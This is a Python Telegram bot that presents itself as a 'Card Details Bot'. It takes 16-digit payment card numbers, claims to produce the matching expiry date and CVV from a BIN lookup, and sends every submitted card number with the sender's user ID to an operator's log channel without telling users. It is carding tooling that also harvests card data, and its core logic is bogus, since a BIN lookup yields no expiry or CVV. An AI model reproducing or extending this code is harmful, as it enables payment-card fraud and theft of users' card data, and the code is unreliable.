import os
import asyncio
import requests
import re
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from binlookup import BinLookup

api_id = "YOUR_API_ID"
api_hash = "YOUR_API_HASH"
bot_token = "YOUR_BOT_TOKEN"
mongo_db_url = "YOUR_MONGODB_URL"
welcome_message = "Welcome to the Card Details Bot! Please enter a 16-digit card number to generate card details."
welcome_pic_url = "https://telegra.ph/Your-Welcome-Pic-URL.jpg"
log_channel = "@your_log_channel"

bot = Client("session", api_id, api_hash, bot_token=bot_token)

@bot.on_message(filters.private & filters.text)
async def generate_card_details(client, message):
    input_text = message.text.strip()
    chat_id = message.chat.id

    # Check if the input matches the card number pattern
    card_number_pattern = r"\d{16}"
    match = re.match(card_number_pattern, input_text)
    if not match:
        await message.reply("Invalid card number format. Please enter a valid 16-digit card number.")
        return

    # Retrieve BIN from the card number
    bin_number = input_text[:6]

    try:
        # Lookup BIN information
        bin_lookup = BinLookup()
        card_info = bin_lookup.lookup(bin_number)

        # Generate full card number
        full_card_number = f"{input_text} {card_info['expiration']} {card_info['cvv']}"

        await message.reply(f"Full Card Number: {full_card_number}")

        # Save generated card details to MongoDB or perform any desired actions
        # Save to MongoDB example:
        # save_to_mongodb(chat_id, full_card_number)

        # Send card details to log channel
        log_message = f"New Card Details:\n\nCard Number: {full_card_number}\nUser ID: {chat_id}"
        await bot.send_message(log_channel, log_message)

    except Exception as e:
        await message.reply("An error occurred while generating card details. Please try again later.")

@bot.on_message(filters.private & filters.command("start"))
async def start_command(client, message):
    await message.reply_photo(welcome_pic_url, caption=welcome_message)

@bot.on_message(filters.private & filters.command("help"))
async def help_command(client, message):
    help_text = "This bot generates card details based on a provided 16-digit card number.\n\n" \
                "To use the bot, simply send a valid 16-digit card number."
    await message.reply(help_text)

bot.run()￼ Enter
